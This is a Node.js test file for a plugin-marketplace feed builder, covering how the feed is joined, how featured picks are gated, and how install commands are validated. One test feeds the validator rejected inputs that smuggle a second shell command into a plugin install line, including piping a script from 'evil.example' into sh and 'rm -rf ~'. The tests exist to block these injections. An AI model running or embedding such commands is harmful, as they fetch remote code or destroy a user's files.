// Tests for the market-v2 pipeline (scripts/market-v2.mjs), run with
//   node --test scripts/test-market-v2.mjs
// The invariants under test: v2 is a strict superset of the published v1
// feed (same entries, same order, v1 fields untouched), mapping failures
// abort the build instead of publishing half-joined data, identical
// inputs keep the previous file bit for bit, and the featured section is
// a pure projection of data/featured.json gated on standardized installs.

import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { resolve } from 'node:path';
import {
  buildMarketV2,
  featuredBlockFor,
  MAX_FEATURED_ENTRIES,
  MAX_FILE_BYTES,
  packagesBlockFor,
  runMarketV2,
  V1_SCHEMA_VERSION,
  V2_SCHEMA_VERSION,
} from './market-v2.mjs';

let nextId = 1;
const v1Entry = (overrides = {}) => ({
  id: nextId++,
  full_name: 'owner/repo',
  description: 'A plugin.',
  stargazers_count: 10,
  language: 'TypeScript',
  license: 'MIT',
  pushed_at: '2026-01-01T00:00:00Z',
  default_branch: 'main',
  category: 'utilities',
  category_zh: '实用工具',
  category_en: 'Utilities',
  ...overrides,
});

const v1Market = (entries, overrides = {}) => ({
  schema_version: V1_SCHEMA_VERSION,
  generated_at: '2026-09-26T08:00:00.000Z',
  source_fetched_at: '2026-09-26T07:00:00.000Z',
  source_repo_count: 100,
  pool_count: 90,
  entries,
  ...overrides,
});

const commandRecord = (overrides = {}) => ({
  packages: [
    {
      profile: 'web',
      install: 'some-plugin',
      source: 'npm:some-plugin',
      command: 'dsh plugin --profile web add some-plugin',
      note: ' fallback note ',
    },
  ],
  requirements: ['Node >= 22'],
  tasks: ['导出 Word'],
  note: ' entry note ',
  status: 'readme-verified',
  verified_date: '2026-09-26',
  verified_via: 'README@main',
  ...overrides,
});

const packages = (entries) => ({ schema_version: 1, updated_at: '2026-09-26', entries });

const featuredSource = (entries, overrides = {}) => ({
  schema_version: 1,
  updated_at: '2026-09-26',
  title_zh: '编辑精选',
  title_en: "Editor's Picks",
  entries,
  ...overrides,
});

const pick = (full_name, reason = '一句话推荐理由') => ({ full_name, reason });

const now = new Date('2026-09-26T10:00:00.000Z');

test('packagesBlockFor folds prose, trims commands, and omits empty optional fields', () => {
  const block = packagesBlockFor(commandRecord({ tasks: undefined, note: '' }));
  assert.deepEqual(block, {
    mode: 'command',
    targets: [
      {
        profile: 'web',
        install: 'some-plugin',
        source: 'npm:some-plugin',
        command: 'dsh plugin --profile web add some-plugin',
        note: 'fallback note',
      },
    ],
    requirements: ['Node >= 22'],
    verification: { status: 'readme-verified', date: '2026-09-26', via: 'README@main' },
  });
  assert.equal('tasks' in block, false);
  assert.equal('note' in block, false);
});

test('packagesBlockFor handles manual installs and unverified records', () => {
  const manual = packagesBlockFor({
    packages: [],
    install_mode: 'manual',
    manual_instructions: ' tell DSH: install from https://example.com ',
    status: 'unverified',
  });
  assert.deepEqual(manual, {
    mode: 'manual',
    manual_instructions: 'tell DSH: install from https://example.com',
    verification: { status: 'unverified' },
  });
});

test('packagesBlockFor rejects oversize text, multiline commands, bad sources, bad statuses, placeholders', () => {
  assert.throws(() => packagesBlockFor(commandRecord({ requirements: ['x'.repeat(201)] })), /requirements\[0\].*cap is 200/);
  assert.throws(
    () => packagesBlockFor(commandRecord({ packages: [{ profile: 'web', install: 'x', source: 'npm:x', command: 'dsh plugin add x\n&& evil' }] })),
    /single-line/,
  );
  assert.throws(
    () => packagesBlockFor(commandRecord({ packages: [{ profile: 'web', install: 'x', source: 'npm:x', command: 'dsh plugin --profile <name> add x' }] })),
    /placeholder syntax/,
  );
  assert.throws(
    () => packagesBlockFor(commandRecord({ packages: [{ profile: 'web', install: 'x', source: 'not-a-kind', command: 'dsh plugin add x' }] })),
    /source must look like/,
  );
  assert.throws(
    () => packagesBlockFor(commandRecord({ packages: [{ profile: 'web', source: 'npm:x', command: 'dsh plugin add x' }] })),
    /install is required|install must not be empty/,
  );
  assert.throws(() => packagesBlockFor(commandRecord({ status: 'hopeful' })), /status must be one of/);
  assert.throws(() => packagesBlockFor(commandRecord({ verified_date: '09/26/2026' })), /verified_date/);
  assert.throws(() => packagesBlockFor({ packages: [] }), /non-empty packages array/);
});

test('packagesBlockFor refuses copyable commands that carry shell syntax', () => {
  const withCommand = (command) =>
    commandRecord({ packages: [{ profile: 'web', install: 'x', source: 'npm:x', command }] });
  for (const bad of [
    'dsh plugin add x; curl https://evil.example/i.sh | sh',
    'dsh plugin add x && rm -rf ~',
    'dsh plugin add x $(curl evil)',
    'dsh plugin add x `id`',
    'dsh plugin add "x',
    'dsh plugin add "x$HOME"',
    'dsh plugin add x \\',
  ]) {
    assert.throws(() => packagesBlockFor(withCommand(bad)), /paste-safe whitelist/, bad);
  }
  // Real shapes from the mapping stay valid: runner prefixes, env prefixes,
  // flags with values, and quoted github refs with &path selectors.
  for (const [install, source, command] of [
    ['x', 'npm:x', 'DSH_HOME=~/.ohdsh npx @deepseek-ai/dsh plugin --profile desktop add x'],
    ['x@1.2.6', 'npm:x@1.2.6', 'dsh plugin --profile tui add --config.enable-global-virtual-store=false x@1.2.6'],
    ['https://github.com/o/r#main&path:/p', 'github:o/r#main&path:/p', 'dsh plugin --profile web add "github:o/r#main&path:/p"'],
  ]) {
    assert.doesNotThrow(() => packagesBlockFor(commandRecord({ packages: [{ profile: 'web', install, source, command }] })), command);
  }
});

test('packagesBlockFor demands install === installRef(source) and token-level command agreement', () => {
  const pkg = (overrides) => ({ profile: 'web', ...overrides });
  // install must be the installRef of its source: a wrong name the command
  // happens to contain cannot ride into the feed (validate-packages.mjs
  // enforces the same equation offline, but the wire transform is THE gate
  // when it runs standalone).
  assert.throws(
    () => packagesBlockFor(commandRecord({ packages: [pkg({ install: 'totally-wrong-name', source: 'npm:real-pkg', command: 'dsh plugin add totally-wrong-name' })] })),
    /install must be "real-pkg"/,
  );
  // A bare substring test is not agreement: foo-bar must not vouch for foo.
  assert.throws(
    () => packagesBlockFor(commandRecord({ packages: [pkg({ install: 'foo', source: 'npm:foo', command: 'dsh plugin add foo-bar' })] })),
    /must reference install \(foo\)/,
  );
  // The same hole on the github slug fallback.
  assert.throws(
    () => packagesBlockFor(commandRecord({ packages: [pkg({ install: 'https://github.com/owner/repo', source: 'github:owner/repo', command: 'dsh plugin add github:owner/repo-evil' })] })),
    /must reference install/,
  );
  // Legitimate shapes still pass: quoted tokens, npm @version pins on the
  // same token, github CLI refs (bare and #ref) and the repo-URL form.
  const passes = (command, install, source) =>
    packagesBlockFor(commandRecord({ packages: [pkg({ install, source, command })] })).targets[0];
  assert.equal(passes('dsh plugin --profile web add "foo@1.2.3"', 'foo', 'npm:foo').install, 'foo');
  assert.equal(passes('dsh plugin --profile web add github:owner/repo#v1', 'https://github.com/owner/repo#v1', 'github:owner/repo#v1').install, 'https://github.com/owner/repo#v1');
  assert.equal(passes('dsh plugin --profile web add "github:owner/repo"', 'https://github.com/owner/repo', 'github:owner/repo').install, 'https://github.com/owner/repo');
  assert.equal(passes('dsh plugin --profile web add https://github.com/owner/repo', 'https://github.com/owner/repo', 'github:owner/repo').install, 'https://github.com/owner/repo');
});

test('buildMarketV2 joins blocks onto mapped entries only, preserving v1 fields and order', () => {
  const entries = [
    v1Entry({ full_name: 'a/mapped' }),
    v1Entry({ full_name: 'B/Unmapped' }),
    v1Entry({ full_name: 'Owner/Also-Mapped' }),
  ];
  const result = buildMarketV2({
    market: v1Market(entries),
    packages: packages({
      'a/mapped': commandRecord(),
      // Keys are lowercase by convention while the feed's full_name keeps
      // GitHub's casing — the join must match case-insensitively.
      'owner/also-mapped': commandRecord({ tasks: undefined }),
      'd/catalog-only': commandRecord(),
    }),
    now,
  });
  assert.equal(result.outcome, 'written');
  assert.equal(result.mappedCount, 2);
  assert.equal(result.envelope.schema_version, V2_SCHEMA_VERSION);
  assert.equal(result.envelope.packages_mapped_count, 2);
  assert.equal(result.envelope.entries.length, 3);
  // v1 fields survive untouched on every entry, order preserved.
  result.envelope.entries.forEach((entry, index) => {
    for (const [field, value] of Object.entries(entries[index])) {
      assert.deepEqual(entry[field], value, `${field} on entry ${index}`);
    }
  });
  assert.ok(result.envelope.entries[0].packages);
  assert.equal('packages' in result.envelope.entries[1], false);
  assert.ok(result.envelope.entries[2].packages);
  // The catalog-only mapping is flagged, not published.
  assert.deepEqual(result.warnings.filter((w) => w.includes('d/catalog-only')).length, 1);
});

test('buildMarketV2 keeps the previous file bit for bit on identical inputs', () => {
  const market = v1Market([v1Entry({ full_name: 'a/mapped' })]);
  const pkgs = packages({ 'a/mapped': commandRecord() });
  const first = buildMarketV2({ market, packages: pkgs, now });
  assert.equal(first.outcome, 'written');
  const second = buildMarketV2({ market, packages: pkgs, previous: first.envelope, now: new Date('2026-09-27T00:00:00.000Z') });
  assert.equal(second.outcome, 'unchanged');
  assert.deepEqual(second.envelope, first.envelope);
});

test('buildMarketV2 never moves generated_at backwards', () => {
  const market = v1Market([v1Entry()]);
  const previous = {
    schema_version: V2_SCHEMA_VERSION,
    generated_at: '2027-01-01T00:00:00.000Z',
    source_fetched_at: market.source_fetched_at,
    source_repo_count: market.source_repo_count,
    pool_count: market.pool_count,
    packages_mapped_count: 0,
    entries: market.entries.map((entry) => ({ ...entry })),
  };
  const result = buildMarketV2({ market, packages: packages({}), previous, now });
  assert.equal(result.outcome, 'unchanged');
  assert.equal(result.envelope.generated_at, previous.generated_at);
});

test('buildMarketV2 aborts on mapping errors instead of publishing half-joined data', () => {
  const result = buildMarketV2({
    market: v1Market([v1Entry({ full_name: 'a/bad' })]),
    packages: packages({ 'a/bad': commandRecord({ status: 'nope' }) }),
    now,
  });
  assert.equal(result.outcome, 'aborted');
  assert.equal(result.errors.length, 1);
  assert.match(result.errors[0], /a\/bad: status must be one of/);
});

test('buildMarketV2 aborts over the byte cap rather than trimming the feed', () => {
  const market = v1Market([v1Entry({ full_name: 'a/mapped', description: 'x'.repeat(300) })]);
  const result = buildMarketV2({ market, packages: packages({ 'a/mapped': commandRecord() }), now, maxBytes: 300 });
  assert.equal(result.outcome, 'aborted');
  assert.match(result.reason, /over the 300-byte cap/);
  assert.match(result.reason, /trim the mapping, not the feed/);
});

test('buildMarketV2 refuses bases that are not the published v1 feed', () => {
  const wrongVersion = buildMarketV2({ market: v1Market([v1Entry()], { schema_version: 2 }), packages: packages({}), now });
  assert.equal(wrongVersion.outcome, 'aborted');
  assert.match(wrongVersion.reason, /schema_version/);
  const empty = buildMarketV2({ market: v1Market([]), packages: packages({}), now });
  assert.equal(empty.outcome, 'aborted');
  assert.match(empty.reason, /no entries/);
});

test('runMarketV2 writes the feed, then reports unchanged on a second run', async () => {
  const rootDir = await mkdtemp(resolve(tmpdir(), 'market-v2-test-'));
  await mkdir(resolve(rootDir, 'data'), { recursive: true });
  const market = v1Market([v1Entry({ full_name: 'a/mapped' }), v1Entry({ full_name: 'b/plain' })]);
  const pkgs = packages({ 'a/mapped': commandRecord() });
  await Promise.all([
    writeFile(resolve(rootDir, 'data/market.json'), JSON.stringify(market)),
    writeFile(resolve(rootDir, 'data/packages.json'), JSON.stringify(pkgs)),
  ]);

  const written = await runMarketV2({ rootDir });
  assert.equal(written, 'written');
  const onDisk = JSON.parse(await readFile(resolve(rootDir, 'data/market-v2.json'), 'utf8'));
  assert.equal(onDisk.schema_version, V2_SCHEMA_VERSION);
  assert.equal(onDisk.packages_mapped_count, 1);
  assert.ok(onDisk.entries[0].packages);
  assert.equal('packages' in onDisk.entries[1], false);
  assert.ok(Buffer.byteLength(JSON.stringify(onDisk)) < MAX_FILE_BYTES);

  const again = await runMarketV2({ rootDir });
  assert.equal(again, 'unchanged');

  // A mapping that fails the transform must leave the published file alone.
  await writeFile(resolve(rootDir, 'data/packages.json'), JSON.stringify(packages({ 'a/mapped': commandRecord({ status: 'broken' }) })));
  const aborted = await runMarketV2({ rootDir });
  assert.equal(aborted, 'aborted');
  const afterAbort = JSON.parse(await readFile(resolve(rootDir, 'data/market-v2.json'), 'utf8'));
  assert.deepEqual(afterAbort, onDisk);
});

test('featuredBlockFor ships in-feed picks bare and out-of-feed picks with an inline packages block', () => {
  const mapping = { 'a/mapped': commandRecord(), 'b/off-feed': commandRecord() };
  const recordFor = (lower) => mapping[lower];
  const inFeed = new Set(['a/mapped']);
  const { block, warnings } = featuredBlockFor(featuredSource([pick('A/Mapped'), pick('b/off-feed')]), recordFor, inFeed);
  assert.equal(block.entries.length, 2);
  // Case-insensitive membership: the pick keeps its canonical casing while
  // resolving against the lowercase feed set.
  assert.deepEqual(block.entries[0], { full_name: 'A/Mapped', reason: '一句话推荐理由' });
  assert.equal('packages' in block.entries[0], false);
  // The out-of-feed pick carries the packages block so consumers stay
  // install-ready without the feed entry (bruc3van/bruce-md2word shape).
  assert.deepEqual(block.entries[1].packages, packagesBlockFor(commandRecord()));
  assert.deepEqual(block.entries[1], { full_name: 'b/off-feed', reason: '一句话推荐理由', packages: packagesBlockFor(commandRecord()) });
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /b\/off-feed: featured, but not in the published feed/);
});

test('featuredBlockFor rejects picks without a standardized mapping, dupes, and malformed sources', () => {
  const recordFor = (lower) => (lower === 'a/mapped' ? commandRecord() : undefined);
  const inFeed = new Set(['a/mapped']);
  // The gate: an editor's pick must be installable through packages.json.
  assert.throws(
    () => featuredBlockFor(featuredSource([pick('x/unmapped')]), recordFor, inFeed),
    /x\/unmapped.*has no packages\.json mapping/,
  );
  assert.throws(
    () => featuredBlockFor(featuredSource([pick('a/mapped'), pick('A/MAPPED')]), recordFor, inFeed),
    /featured twice/,
  );
  assert.throws(() => featuredBlockFor(featuredSource([])), /non-empty array/);
  assert.throws(() => featuredBlockFor(featuredSource([pick('a/mapped')], { schema_version: 2 })), /schema_version/);
  assert.throws(() => featuredBlockFor(featuredSource([pick('a/mapped')], { updated_at: '09/26/2026' })), /updated_at/);
  assert.throws(() => featuredBlockFor(featuredSource([pick('not-a-slug')]), recordFor, inFeed), /owner\/repo slug/);
  assert.throws(() => featuredBlockFor(featuredSource([pick('a/mapped', 'x'.repeat(121))]), recordFor, inFeed), /cap is 120/);
  const many = Array.from({ length: MAX_FEATURED_ENTRIES + 1 }, (_, i) => pick(`o/repo-${i}`));
  assert.throws(() => featuredBlockFor(featuredSource(many), () => commandRecord(), inFeed), /cap is 50/);
});

test('buildMarketV2 carries the featured section and counts it honestly', () => {
  const entries = [v1Entry({ full_name: 'a/mapped' })];
  const result = buildMarketV2({
    market: v1Market(entries),
    packages: packages({ 'a/mapped': commandRecord(), 'b/off-feed': commandRecord() }),
    featured: featuredSource([pick('a/mapped'), pick('b/off-feed')]),
    now,
  });
  assert.equal(result.outcome, 'written');
  assert.equal(result.envelope.featured_count, 2);
  assert.equal(result.envelope.featured.entries.length, 2);
  assert.equal(result.envelope.featured.title_zh, '编辑精选');
  assert.ok(result.envelope.featured.entries[1].packages);
  // A pick that fails the gate aborts the whole build, feed join included.
  const bad = buildMarketV2({
    market: v1Market(entries),
    packages: packages({ 'a/mapped': commandRecord() }),
    featured: featuredSource([pick('a/mapped'), pick('x/unmapped')]),
    now,
  });
  assert.equal(bad.outcome, 'aborted');
  assert.match(bad.errors[0], /x\/unmapped.*has no packages\.json mapping/);
});

test('buildMarketV2 treats a featured-only edit as a change worth republishing', () => {
  const market = v1Market([v1Entry({ full_name: 'a/mapped' })]);
  const pkgs = packages({ 'a/mapped': commandRecord() });
  const first = buildMarketV2({ market, packages: pkgs, featured: featuredSource([pick('a/mapped')]), now });
  assert.equal(first.outcome, 'written');
  // Same everything: unchanged, bit for bit.
  const same = buildMarketV2({ market, packages: pkgs, featured: featuredSource([pick('a/mapped')]), previous: first.envelope, now: new Date('2026-09-27T00:00:00.000Z') });
  assert.equal(same.outcome, 'unchanged');
  assert.deepEqual(same.envelope, first.envelope);
  // A new reason with identical feed + mapping must still republish.
  const edited = buildMarketV2({ market, packages: pkgs, featured: featuredSource([pick('a/mapped', '换了一句推荐语')]), previous: first.envelope, now });
  assert.equal(edited.outcome, 'written');
  assert.equal(edited.envelope.featured.entries[0].reason, '换了一句推荐语');
  // Dropping the featured source is likewise a change — but runMarketV2
  // guards the destructive variant (published section + missing source).
  const dropped = buildMarketV2({ market, packages: pkgs, previous: first.envelope, now });
  assert.equal(dropped.outcome, 'written');
  assert.equal('featured' in dropped.envelope, false);
});

test('runMarketV2 aborts when the featured source vanished but the published feed still carries the section', async () => {
  const rootDir = await mkdtemp(resolve(tmpdir(), 'market-v2-featured-'));
  await mkdir(resolve(rootDir, 'data'), { recursive: true });
  const market = v1Market([v1Entry({ full_name: 'a/mapped' })]);
  const pkgs = packages({ 'a/mapped': commandRecord() });
  await Promise.all([
    writeFile(resolve(rootDir, 'data/market.json'), JSON.stringify(market)),
    writeFile(resolve(rootDir, 'data/packages.json'), JSON.stringify(pkgs)),
    writeFile(resolve(rootDir, 'data/featured.json'), JSON.stringify(featuredSource([pick('a/mapped')]))),
  ]);
  const written = await runMarketV2({ rootDir });
  assert.equal(written, 'written');
  const onDisk = JSON.parse(await readFile(resolve(rootDir, 'data/market-v2.json'), 'utf8'));
  assert.equal(onDisk.featured_count, 1);

  await rm(resolve(rootDir, 'data/featured.json'));
  const aborted = await runMarketV2({ rootDir });
  assert.equal(aborted, 'aborted');
  const afterAbort = JSON.parse(await readFile(resolve(rootDir, 'data/market-v2.json'), 'utf8'));
  assert.deepEqual(afterAbort, onDisk);
});
